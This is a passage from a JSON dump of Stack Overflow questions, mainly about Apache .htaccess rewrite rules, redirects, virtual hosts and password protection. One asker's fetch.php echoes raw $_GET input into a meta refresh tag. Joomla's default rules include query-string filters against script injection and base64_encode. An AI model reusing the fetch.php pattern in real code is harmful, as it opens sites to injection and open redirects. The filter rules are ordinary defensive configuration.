name is cyrillic google viewer can't open file, but if file name is no-cyrillic(exp. 'test') google viewer can open file:</p>\n\n<pre><code>$fileSrc = 'http://mysite/presentations/тест-тест.ppt';\n$fileSrc = 'http://mysite/presentations/test-test.ppt';\n</code></pre>\n"},{"tags":["php",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":51,"score":-1,"question_id":12748929,"title":"How to make a rule for this?","body":"<pre><code>http://mysite.com/staticcategory/page_name\n</code></pre>\n\n<p>change to</p>\n\n<pre><code>http://mysite.com/category/page-name?post_type=question\n</code></pre>\n\n<p>How to be a rule for this?</p>\n"},{"tags":["php",".htaccess"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":99,"score":0,"question_id":12290396,"title":"use .htaccess to hide directory structure when serving files","body":"<p>I am serving .pdf docs to users through anchor tags. However, serving the full document path through the anchor tag exposes the server directory structure. Here is a sample doc location:\nmydomain.com/_webstuff/docs/proj03/sub01/111.pdf</p>\n\n<p>I am attempting to create an .htaccess that accepts the \"proj03/sub01/111.pdf\" portion, and redirects to the above full URI.</p>\n\n<p>The HTML, then, would look like this:</p>\n\n<pre><code>View &lt;a href=\"proj03/sub01/111.pdf\"&gt;111.pdf&lt;/a&gt;\n</code></pre>\n\n<p>This is the unworking htaccess:</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ /fetch.php?f=$1\n</code></pre>\n\n<p>FETCH.PHP looks like this:</p>\n\n<pre><code>&lt;?php\n$f = $_GET['f'];\necho '&lt;meta HTTP-EQUIV=\"REFRESH\" content=\"0; url=_webstuff/docs/' . $f . '\"&gt;';\n</code></pre>\n\n<p>I'm sure there's a much better way to do this.</p>\n\n<p>EDIT:\nMEA CULPA. My error was this: I had to add a slash before the url in FETCH.PHP, as follows:</p>\n\n<p>NEW FETCH.PHP</p>\n\n<pre><code>&lt;?php\n$f = $_GET['f'];\necho '&lt;meta HTTP-EQUIV=\"REFRESH\" content=\"0; url=/_webstuff/docs/' . $f . '\"&gt;';\n</code></pre>\n\n<p>HOWEVER... My design is still wrong, because the document shows the true document path in the address bar. That is, when the .pdf document is displayed in the browser window, the fully qualified URI is there for all to see. I'm too clever by half. Loop back to my earlier comment: \"I'm sure there's a much better way to do this.\"</p>\n\n<p>Suggestions?</p>\n"},{"tags":[".htaccess","http-redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":12747922,"title":"Wrong 301 htaccess redirection","body":"<p>I have this code on my site and I need to redirect the <a href=\"http://softsolutions.fr\" rel=\"nofollow\">http://softsolutions.fr</a> to <a href=\"http://www.softsolutions.fr\" rel=\"nofollow\">http://www.softsolutions.fr</a>, but it is not redirecting:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;    \n  Options +FollowSymlinks\n  Options +Indexes\n  RewriteEngine On\n\n    RewriteCond %{HTTP_HOST} ^softsolutions\\.fr\n    RewriteRule ^(.*)$ http://www.softsolutions.fr/index.html [R=301,L]     \n\n  RewriteRule    ^$    /index.html    [L]\n\n    # Rewrites \"sub.domain.foo/anything\" to \"sub.domain.foo/anything.php\"\n    RewriteCond %{REQUEST_FILENAME} !^(.+).php$\n    RewriteCond %{REQUEST_FILENAME} !^(.+).pdf$\n    RewriteCond %{REQUEST_FILENAME} !^(.+).(html|htm)$\n    RewriteRule    ^([a-zA-Z0-9\\-\\_/]*)$    /$1.php    [L]  \n\n&lt;/IfModule&gt;\n</code></pre>\n"},{"tags":[".htaccess","mod-rewrite","hide","root"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":72,"score":0,"question_id":12736989,"title":".htaccess change root folder and hide .html/.php extensions","body":"<p>I have changed the root folder using .htaccess but I also need hide the .html/.php extensions this is where i'm having trouble. I found alternatives to hide the extensions but its not as simple as I thought. Here is what I done so far>>></p>\n\n<pre><code>RewriteEngine on\n\nRewriteCond %{HTTP_HOST} ^(www.)?cornellbond.co.uk$\n\nRewriteCond %{REQUEST_URI} !^/liveSite/\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ /liveSite/$1\nRewriteCond %{HTTP_HOST} ^(www.)?cornellbond.co.uk$\nRewriteRule ^(/)?$ liveSite/index.html [L]\n</code></pre>\n\n<p>This Works but when I add the following code to it everything stops working. </p>\n\n<p>I then wanted to hide the .html/.php extensions I found this code on here SOF, so combined the two and all i got back is errors. </p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine on\n\nRewriteCond %{REQUEST_FILENAME} !-f       # if the requested URL is not a file that exists\nRewriteCond %{REQUEST_FILENAME} !-d       # and it isn't a directory that exists either\nRewriteCond %{REQUEST_FILENAME}\\.html -f  # but when you put \".html\" on the end it is a file that exists\nRewriteRule ^(.+)$ $1\\.html [QSA]         # then serve that file\n\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>So my code looked like this all together which >>></p>\n\n<pre><code>RewriteEngine on\n\nRewriteCond %{HTTP_HOST} ^(www.)?cornellbond.co.uk$\n\nRewriteCond %{REQUEST_URI} !^/liveSite/\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ /liveSite/$1\nRewriteCond %{HTTP_HOST} ^(www.)?cornellbond.co.uk$\nRewriteRule ^(/)?$ liveSite/index.html [L]\n\n&lt;IfModule mod_rewrite.c&gt;\n\nRewriteCond %{REQUEST_FILENAME} !-f      \nRewriteCond %{REQUEST_FILENAME} !-d      \nRewriteCond %{REQUEST_FILENAME}\\.html -f  \nRewriteRule ^(.+)$ $1\\.html [QSA]         \n\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>If I could get a work around for this I would be most grateful. Did i say this all new to me and i'm still learning =P Thanks again</p>\n"},{"tags":["php",".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":76,"score":1,"question_id":12743060,"title":".htaccess internal redirect not working for subfolder","body":"<p>I have a site that has another site inside of it in a sub folder. For example, <code>www.domain.com</code> and the sub folder would be <code>www.domain.com/uk/</code>. They both contain duplicate files, so even the <code>.htaccess</code> file is same. Now the problem is when I redirect users through <code>.htaccess</code> inside the <code>uk</code> subfolder to a file in the same directory it redirects them to the file in the parent site with the duplicate name.</p>\n\n<p>This is the rule I have used in my .htaccess file:</p>\n\n<pre><code>RewriteRule ^category/[a-zA-Z0-9_-]+/([a-zA-Z0-9_-]+)/([a-zA-Z0-9_-]+)/([a-zA-Z0-9_-]+)/$ final_final.php \n</code></pre>\n\n<p>I don't have much experience with mod_rewrite. </p>\n"},{"tags":[".htaccess","redirect","https"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1601,"score":0,"question_id":4686668,"title":"https redirect for Network Solutions","body":"<p>I am using Network Solutions as a hosting provider with a UNIX hosting package. I need to redirect certain pages to https (login, etc). After going through a lot of testing, I ended up with the following .htaccess entry:</p>\n\n<pre><code>RewriteEngine on\n\nRewriteCond %{SERVER_PORT} !^443$ [OR]\nRewriteCond %{HTTPS} off\nRewriteRule ^(.*)$ https://[domain_redacted]/$1 [R=301,L]\n</code></pre>\n\n<p>This resulted in an infinite redirect loop. After discussions with Network Solutions, they told me I needed to 301 redirect (apparently what I was doing is not a 301 redirect ...), so I then tried the following in .htaccess:</p>\n\n<pre><code>Redirect 301 / https://[domain_redacted]/\n</code></pre>\n\n<p>This, of course, resulted in an infinite loop, as one would expect. Since none of these methods worked, I put the following php script on my server to test https detection through PHP:</p>\n\n<pre><code>&lt;?php \nif(isset($_SERVER['HTTPS']) &amp;&amp; $_SERVER['HTTPS'] != 'off') { \n    echo 'HTTPS IS ON';\n} else {\n    echo 'HTTPS IS OFF';\n} \n?&gt;\n</code></pre>\n\n<p>When requesting this page over both HTTP and HTTPS, the script returns OFF. </p>\n\n<p>So, what other methods exist to detect HTTPS server side in Apache or PHP?</p>\n"},{"tags":["osx","apache",".htaccess","virtualhost","hosts"],"answer_count":2,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":2645,"score":5,"question_id":8453662,"title":"How to get a virtual host to work in OS X Lion?","body":"<p>I'm trying to set up a virtual host on my Mac OS X 10.7 Installation.\nI'm using VirtualHostX to manage my /etc/hosts and httpd-vhosts.conf file.\nCurrently, my httpd-vhosts.conf file looks like this:</p>\n\n<pre><code>NameVirtualHost *:80\n\n&lt;Directory \"/Users/yuval/Sites/mysite/\"&gt;\nAllow From All\nAllowOverride All\n&lt;/Directory&gt;\n&lt;VirtualHost *:80&gt;\n    ServerName \"mysite.dev\"\n    DocumentRoot \"/Users/yuval/Sites/mysite\"\n&lt;/VirtualHost&gt;\n</code></pre>\n\n<p>and my /etc/hosts files has this in it:</p>\n\n<pre><code># VHX START\n127.0.0.1 mysite.dev\nfe80::1%lo0 mysite.dev\n# VHX STOP\n</code></pre>\n\n<p>I activated Web Sharing under System preferences, and I know apache is running. However, when I navigate to either 127.0.0.1 or to mysite.dev, I get the following:</p>\n\n<blockquote>\n  <p>Forbidden</p>\n  \n  <p>You don't have permission to access / on this server.</p>\n</blockquote>\n\n<p>My permissions on /Users/yuval/Sites/mysite are 755. Trying to change them to 777 didn't help either. Note that this is happening with any folder I choose -- I do not have an .htaccess file in /Users/yuval/Sites/mysite.</p>\n\n<p><strong>Update</strong>: Checking the apache error, these are the logs that appear:</p>\n\n<pre><code>[Fri Dec 09 17:59:27 2011] [error] [client 127.0.0.1] (13)Permission denied:\n    access to / denied\n[Fri Dec 09 17:59:27 2011] [error] [client 127.0.0.1] (13)Permission denied:\n    access to /favicon.ico denied\n</code></pre>\n\n<p>It seems pretty obvious that the vhosts + hosts code is doing its job in actually determining that the address exists, but for some reason this isn't working. Any ideas?</p>\n"},{"tags":["php","apache",".htaccess","xampp"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":111,"score":2,"question_id":12340918,"title":"XAMPP with Apache; .htpassword passwords dont get read as encrypted","body":"<p>When trying to password protect a page using .htaccess and .htpasswd, I go to the page I have protected and type in the username and password. The problem is the password I encrypted is not the one I have to type in. Instead it is the encrypted password.</p>\n\n<p>For Example:</p>\n\n<pre><code>lol:noitcS2m.5F6.\n</code></pre>\n\n<p>I enter <code>lol</code> as the username and <code>noitcS2m.5F6.</code> as the password and it lets me in.</p>\n\n<p>However, if I use the password I encrypted it doesn't work. Could anyone explain to me what I'm doing wrong? I installed XAMPP 1.8.0, with Apache 2.4.2 and PHP 5.4.4.</p>\n\n<p>My .htaccess file includes the following :</p>\n\n<pre><code>AuthType Basic\nAuthName \"restricted area\"\nAuthUserFile C:/xampp/htdocs/pass/.htpasswd\nrequire valid-user\n</code></pre>\n\n<p>It is located in <code>C:/xampp/htdocs/dl/</code></p>\n\n<p>Also if I the <code>AuthUserFile</code> is <code>/dl/.htpasswd</code> then it will give me error 500.</p>\n"},{"tags":[".htaccess","cakephp","cakephp-1.3"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12746266,"title":"404 error in ubuntu using Cakephp 1.3","body":"<p>I am using cakephp1.3 </p>\n\n<p>now i open this link </p>\n\n<blockquote>\n  <p>localhost/cakephp-ypsv2/list_of_teachers/login</p>\n</blockquote>\n\n<p>it shows 404 not found</p>\n\n<p>and when i tried this in window it works fine </p>\n\n<p>Any body tell me all steps how to resolve this issue </p>\n\n<p>Thanks</p>\n"},{"tags":["php","html","regex",".htaccess","web"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12745690,"title":"Routing a URL to a php argument","body":"<p>i have a URL which i would like to re-route in the following manner:</p>\n\n<pre><code>example.com/H4tX\n</code></pre>\n\n<p>to</p>\n\n<pre><code>example.com/game.php?id=h4tX\n</code></pre>\n\n<p>for this i have the following .htacces file in the cgi-bin folder of my domain:</p>\n\n<pre><code>RewriteEngine On\nRewriteRule ^([a-zA-Z0-9_]+)$ game.php?id=$1\n</code></pre>\n\n<p>However, if i try to go to example.com/H4tX, the page cannot be found. Did i miss something here? htaccess pretty much gives no feedback at all :/\nThanks, Thomas</p>\n"},{"tags":[".htaccess","mod-rewrite","seo","friendly-url","seo-friendly"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":37,"score":1,"question_id":12730154,"title":"Mod_rewrite works but path is changed","body":"<p>I have urls like this index.php?section=products&amp;id=12 and I want urls like this /products/shirt-12 (where shirt is the name of the product).</p>\n\n<p>So I have a PHP script that, when you add a product, adds a line to .htaccess. Here is my .htaccess with 1 product added:</p>\n\n<pre><code>RewriteEngine On\nRewriteRule /products/shirt-12 /index.php?section=products&amp;id=12\n</code></pre>\n\n<p>The thing is that when I write www.domain.com/product/shirt-12 in my browser, no scripts/images are included, I look into an image-not-loaded-square and it was trying to load the image from /products/images/img.jpg insted of /images/img.jpg. How can I solve this issue?\nI tried DocumentRoot but I get a 500 error. What should I do?</p>\n\n<p><strong>EDIT</strong>: also if I put <code>/index.php?section=products&amp;id=12</code> in my browser the url is not rewritten, it works like always.</p>\n"},{"tags":["php","apache",".htaccess","subdirectory"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":12331065,"title":"Deny access to php files but allow some other php files in subdirectory","body":"<p>I have a directory named \"template\". There are some php files that I don't want people have direct access to them, So I wrote this in htaccess :</p>\n\n<pre><code>&lt;Files *.php&gt;\n    Order Deny,Allow\n    Deny from all\n&lt;/Files&gt;\n</code></pre>\n\n<p>Also there is some files that I want people have direct access to them, these files are named as: </p>\n\n<blockquote>\n  <p>switcher.php, switcher1.php, switcher2.php, switcher3.php, switcher4.php, switcher5.php</p>\n</blockquote>\n\n<p>And located at <code>template/styles/theme/</code></p>\n\n<p>So I created a new htaccess file in that location and wrote this :</p>\n\n<pre><code>&lt;FilesMatch \"^switcher[1-5]?\\.php$\"&gt;\n    Order Allow,Deny\n    Allow from all\n&lt;/FilesMatch&gt;\n</code></pre>\n\n<p>This works good on my localhost, but when I upload the script on a cPanel Shared Host, it didn't work there. Access to all php files denied.</p>\n\n<p>What can I do to fix this problem?</p>\n\n<p>I can't ask hosting to make changes, because this script should installed on at least 30 shared hosts with different configurations!</p>\n"},{"tags":[".htaccess","mod-rewrite","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":11,"score":0,"question_id":12399675,"title":"htaccess redirection to new params","body":"<p>i want an html redirection to a different php and params, the phps are inside a subdirectory , for example, from an /subdir/index.php?thread=23-post=12 /subdir/to showthread.php?topic=23&amp;topic=12. But isn't working this:</p>\n\n<pre><code>RewriteRule ^/test/index\\.php?thread=(.*)-post=(.*)$ /test/showthread.php?topic=$1&amp;topic=$2 [R]\n</code></pre>\n\n<p>Any suggestion?</p>\n\n<p>thanks in advance</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":17,"score":0,"question_id":12742839,"title":"Redirect everything but redirection page and images","body":"<p>I'm trying to redirect all pages temporarily to another maintenance page for example, but I obviously don't want the page it gets redirected to to be redirected and I don't want images redirected either.</p>\n\n<p>I have the below but I get a internal server error.. (I'm also allowing my IP)</p>\n\n<pre><code>Options +FollowSymlinks\nRewriteEngine on\nRewriteCond %{REMOTE_HOST} !^123\\.45\\.67\\.89\nRewriteCond %{REQUEST_URI} !^/message.php\nRewriteCond %{REQUEST_URI} !^*\\.(png|jpg|jpeg|gif)\nRewriteRule ^(.*)$ /message.php [R=302,L]\n</code></pre>\n\n<p>What am I doing wrong?</p>\n"},{"tags":["php",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12371464,"title":".htaccess redirect file request to PHP","body":"<p>I need to redirect request of *.pe files to admin.php and pas the requested file as argument.</p>\n\n<p>ex: the user request \"site.com/dir/file.pe\" and it will be redirected to \"admin.php?file=file.pe\"</p>\n\n<p>I tryed:</p>\n\n<pre><code>&lt;files *.pe&gt; \nErrorDocument 403 /login/db/admin.php?file=%{REQUEST_FILENAME}\nOrder allow,deny\nDeny from all\nSatisfy All\n&lt;/files&gt;\n</code></pre>\n\n<p>but PHP's $_GET['file'] returns \"%{REQUEST_FILENAME}\"</p>\n\n<p>.htaccess isn't passing the name, it's passing the %{REQUEST_FILENAME} as string, not the var.</p>\n\n<p>How could I make it work?</p>\n\n<p>thx</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":12739642,"title":".htaccess - affects all subdomains, how to exclude?","body":"<p>I have the following code:</p>\n\n<pre><code>RewriteEngine on \n#Options +FollowSymLinks \n\nRewriteCond %{HTTP_HOST} ^raal.co.il\nRewriteRule (.*) http://www.raal.co.il/$1 [R=301,L]\n\nRewriteCond %{SCRIPT_FILENAME} !\\.(gif|jpg|JPG|png|css|php|js|html|htm|psd|rar|htc)$\nRewriteRule ^(.*)$ index.php?a=$1 [L]\n</code></pre>\n\n<p>but then when i create subdomains, i get an error due to this code.</p>\n\n<p>I want - fb.raal.co.il - to not be affected by the .htaccess of the main path.</p>\n\n<p>i've tried adding something like this to the main .htaccess:</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} ^fb\\.raal\\.co\\.il\nRewriteRule (.*) http://fb.raal.co.il/$1\n</code></pre>\n\n<p>but it wont work .. </p>\n"},{"tags":[".htaccess","codeigniter","codeigniter-url"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":12740622,"title":".htaccess not working in LAMP","body":"<p>i used CI, i downloaded project from server it has a .htaccess file. when i run these project in my localhost is not working, i have to put index.php after project path , like example.com/index.php/controller/method. there is read/write rule in .htaccess file. for run .htacces i use these much but still not working.\nIn <code>/etc/apache2/sites-available/default</code> modify the line containing <code>AllowOverride None</code> to read <code>AllowOverride All</code>. and then restart apache.\nfor check read/write rule enable or not i run <code>a2enmod rewrite</code> it's shows <code>Module rewrite already enabled</code>. \nso, how can i run .htacess file, i want to remove index.php from URL in my CI from localhost.</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12740014,"title":"Infinite loop error with .htaccess when I add 301 redirect with WordPress in subdirectory","body":"<p>I have my WordPress website in a subdirectory. I used the WordPress codex directions to set this up and all worked well until client asked me to add a 301 redirect to solve an issue with some links to an old domain on the Internet. The old domain name points to the new website but does not use a permanent 301 redirect. The current domain name is Encoreco.com.</p>\n\n<p>The old domain points to the same place but it is not a 301 redirect (you can see that the URL does not change at the top and for some reason this means that my javascript slideshow doesn't work). Here is what happens: <a href=\"http://encoreconstructionco.com/\" rel=\"nofollow\">encoreconstructionco.com</a></p>\n\n<p>When I add a 301 redirect to solve this problem, I get the infinite loop errors. Here is the line of code that attempts to solve the issue with the old domain but creates the infinite loop:</p>\n\n<pre><code>RewriteRule (.*) http://encoreco.com/$1 [R=301,L]\n</code></pre>\n\n<p>And here is my current .htaccess: Note - I tried taking the .html rewrite and the www rewrite out and that did not solve the problem.</p>\n\n<pre><code>RewriteCond %{THE_REQUEST} \\.html\nRewriteRule ^(.*)\\.html$ /$1 [R=301,L]\n\n# Redirect www to non-www\nRewriteCond %{HTTP_HOST} ^www\\.(.*)\nRewriteRule (.*) http://%1/$1 [R=301,L]\n\n# BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n\n# END WordPress\n</code></pre>\n"},{"tags":["php",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":30,"score":1,"question_id":12739797,"title":"Modify the URL through an .htaccess file","body":"<p>I have a URL which looks like</p>\n\n<pre><code>localhost/myapp/index.php?mod=user&amp;page=createuser\n</code></pre>\n\n<p>I want the URL to look like</p>\n\n<pre><code>localhost/user/createuser\n</code></pre>\n\n<p>How do I do this with a htaccess file?</p>\n"},{"tags":["apache",".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":12690947,"title":"Apache rewrite/forward URL?","body":"<p>I am setting up an Apache reverse proxy to forward requests to an IIS 7 webserver.  What I want to do is the following:</p>\n\n<pre><code>forward https://alias.abc.com/application to https://actual_hostname/application\nforward https://alias.abc.com/ to https://actual_hostname/application\n</code></pre>\n\n<p>I've figured out how to do the first forward.  I can't figure out how to append \"/application\" when only the request only contains the domain.  The request gets forwarded to the IIS default web page.  This is what I have and have tried:</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} ^alias.abc.com$\nRewriteRule ^$ https://alias.abc.com/application/ [P,NC]\nReWriteRule ^(.*) https://actual_hostname/$1 [P,NC]\n</code></pre>\n\n<p><code>https://alias.abc.com/application redirects correctly.  https://alias.abc.com goes to the IIS default page</code></p>\n\n<pre><code>RewriteCond %{HTTP_HOST} ^alias.abc.com$\nReWriteRule ^(.*) https://actual_hostname/application/$1 [P,NC]\n</code></pre>\n\n<p><code>https://alias.abc.com/application does not redirect correctly.  It seems to append a second \"/application\" to the URL and breaks it.  https://alias.abc.com goes to the IIS default page</code></p>\n\n<pre><code>RewriteCond %{HTTP_HOST} ^alias.abc.com$\nRewriteRule ^$ https://alias.abc.com/application/ [L,R=301]\n</code></pre>\n\n<p><code>https://alias.abc.com/application is not even found.  https://alias.abc.com goes to the IIS default page</code></p>\n\n<pre><code>RewriteCond %{HTTP_HOST} ^alias.abc.com$\nReWriteRule ^(.*) https://actual_hostname/application [P,NC]\n</code></pre>\n\n<p><code>https://alias.abc.com/application gives me 401 unauthorized.  https://alias.abc.com also gives me 401 unauthorized.</code></p>\n"},{"tags":["wordpress",".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12736335,"title":"Wordpress MU - Being able to access index .html and .php","body":"<p>I have an index <code>.html</code> hold page but I would like to access wordpress's <code>.php</code>.  What do I need to place into my .htaccess to enable this?</p>\n\n<pre><code>RewriteEngine On\nOptions +FollowSymlinks\nRewriteBase /\nRewriteCond %{HTTP_HOST} ^(www\\.)(.*)$ [NC]\nRewriteRule ^(.*)$ http://%2/$1 [L,R=301]\nRewriteRule ^index\\.php$ - [L]\n\n# uploaded files\nRewriteRule ^files/(.+) wp-includes/ms-files.php?file=$1 [L]\n\nRewriteCond %{REQUEST_FILENAME} -f [OR]\nRewriteCond %{REQUEST_FILENAME} -d\nRewriteRule ^ - [L]\nRewriteRule . index.php [L]\n</code></pre>\n"},{"tags":[".htaccess","joomla2.5","password-protection",".htpasswd"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":74,"score":0,"question_id":12656308,"title":"URL rewritting with a password protected subfolder (in a joomla site)","body":"<p>I have a Joomla 2.5 site set up, and SEO turned on, and \"activated\" the .htaccess file.</p>\n\n<p>Now the problem is i have a folder which is a special admin site, where some other settings are set and a lot of other stuff, and this folder i can not password protect (with htaccess and htpasswd)  if the url rewritting is on for joomla.</p>\n\n<p>Now when i try to access the subfolder:</p>\n\n<p>If url rewritting is on, a get page not found.\nif its of, i get the password popup.\nIf url rewritting is on and the htaccess file in the subfolder is removed, i can access the subfolder (but without a password popup of course)</p>\n\n<p>So is this possible somehow? or do i need to turn to Sessions for making a custom login to this admin, which i was trying to avoid.</p>\n\n<p>The joomla htaccess looks as follows (i have removed all the comment lines)</p>\n\n<pre><code>Options +FollowSymLinks\n\nRewriteEngine On\n\nRewriteCond %{QUERY_STRING} base64_encode[^(]*\\([^)]*\\) [OR]\nRewriteCond %{QUERY_STRING} (&lt;|%3C)([^s]*s)+cript.*(&gt;|%3E) [NC,OR]\nRewriteCond %{QUERY_STRING} GLOBALS(=|\\[|\\%[0-9A-Z]{0,2}) [OR]\nRewriteCond %{QUERY_STRING} _REQUEST(=|\\[|\\%[0-9A-Z]{0,2})\nRewriteRule .* index.php [F]\nRewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]\nRewriteCond %{REQUEST_URI} !^/index\\.php\nRewriteCond %{REQUEST_URI} /component/|(/[^.]*|\\.(php|html?|feed|pdf|vcf|raw))$ [NC]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule .* index.php [L]\n</code></pre>\n\n<p>My htaccess and htpasswd file in the subfolder looks like a standard password protetion.</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":45,"score":1,"question_id":12737308,"title":"hide html extension + redirect .html version + special case exception","body":"<p>I have a hard time understanding htaccess mod_rewrite and while I found several related questions + answers, I unfortunately can't get my very specific situation to work correctly (mod_rewrite is even after hours of searching a book of seven seals to me to be honest)  </p>\n\n<p>I have foo.html and bar.html within my root directory. Now, I'd like to have foo.html as the default directory index (solved, easy), but from there I do not get it.  </p>\n\n<p>What I want to achieve is:  </p>\n\n<ol>\n<li>hiding the .html extensions<br>\nuser should be able to type <code>/bar</code> to get <code>/bar.html</code> without seeing the .html (for every .html)   </li>\n<li>301 redirecting .html version<br>\nuser should be able to type <code>/bar.html</code> and see <code>/bar</code> in the url (avoid duplicate, for every .html)  </li>\n<li>The most tricky part:<br>\nAs <code>foo.html</code> is default directory index, typing / already shows (transparently) <code>/foo.html</code>, but I need typing <code>/foo.html</code> to resolve to / as well as typing /foo to resolve to /  </li>\n</ol>\n"},{"tags":["php","html","apache",".htaccess","web"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12736588,"title":".htaccess remove php extension for first directory only","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/12372096/remove-php-file-extension-in-url\">Remove .PHP File Extension in URL</a>  </p>\n</blockquote>\n\n\n\n<p>I have my .htaccess file set up to omit .php extensions from URLs.  For instance:</p>\n\n<p>mysite.com/page<br />\nmysite.com/item<br />\nmysite.com/about<br /></p>\n\n<p>Read from:</p>\n\n<p>mysite.com/page.php<br />\nmysite.com/item.php<br />\nmysite.com/about.php<br /></p>\n\n<p>Which is great; however, I use the remaining part of the URL for parameters, which I want to be ignored.  For instance, I want:</p>\n\n<p>mysite.com/item/1234567890/a-product</p>\n\n<p>To read from:</p>\n\n<p>mysite.com/item.php</p>\n\n<p>Rather than:</p>\n\n<p>mysite.com/item/1234567890/a-product.php</p>\n\n<p>Any idea how I can accomplish this in .htaccess? Here is my current .htaccess file:</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME}\\.php -f\nRewriteRule ^(.*)$ $1.php\n</code></pre>\n"},{"tags":["apache",".htaccess","redirect"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":12735770,"title":"Redirect local request to another file","body":"<p>I'm trying to redirect a file to another file, but I don't understand htaccess enough to get it working.</p>\n\n<p>Basically, for example, if someone accesses <code>mysite.com/i/somefile.png</code> I need it to redirect to <code>mysite.com/view.php?i=somefile</code> (without the .png extension)</p>\n\n<p>I'm also trying to set it so that this process only happens local requests, so if the image is embedded on another site, it wont be redirected.</p>\n\n<p>If someone could provide the code for this, and also explain it a bit so I have a better understanding for future use, I'd appreciate it a lot.</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","redirect","environment-variables"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":12735132,"title":"htaccess RewriteRule Redirect with R,L,E flags (environment variable)","body":"<p>i want to set a apache env variable after redirection from htaccess</p>\n\n<p><code>RewriteRule ^somelink/$ /somelink.php [L,R,E=HOWTO:ok]</code><br></p>\n\n<p><code>[L,R]</code> flags because i want to change address in browser address bar<br>\n<code>[E]</code> flag because i want to set variable</p>\n\n<p><code>[E=HOWTO:ok]</code> should set the variable but nothing happend</p>\n\n<p>i tried var_dump($_SERVER) on somelink.php after redirection but any HOWTO appears<br>\nbut if i use <code>SetEnv HOWTO ok</code> everything is ok</p>\n\n<h2>how to set apache environment variable with [R,L] redirection and get it in php file?</h2>\n"},{"tags":["wordpress","apache",".htaccess","redirect"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":12732028,"title":"htaccess REQUEST_URI works for urls but not IP addresses in Wordpress default htaccess","body":"<p>I'm getting pretty confused my htaccess file.</p>\n\n<p>If I use the following directives:</p>\n\n<pre><code>RewriteCond %{REQUEST_URI} distribute$\nRewriteRule (.*) BalanceManager.php [L]\n</code></pre>\n\n<p>Then I expect <code>https://somehwhere.com/distribute</code> to redirect to <code>https://somehwhere.com/BalanceManager.php</code> with <code>POST</code> data in place... this is exactly what happens, which is great.</p>\n\n<p>I also expect <code>https://184.22.345.77/distribute</code> to redirect to <code>https://184.22.345.77/BalanceManager.php</code> with <code>POST</code> data in place. It does NOT do this, it throws a 404 not found.</p>\n\n<p>I need this to work on IP addresses and under SSL protocol, 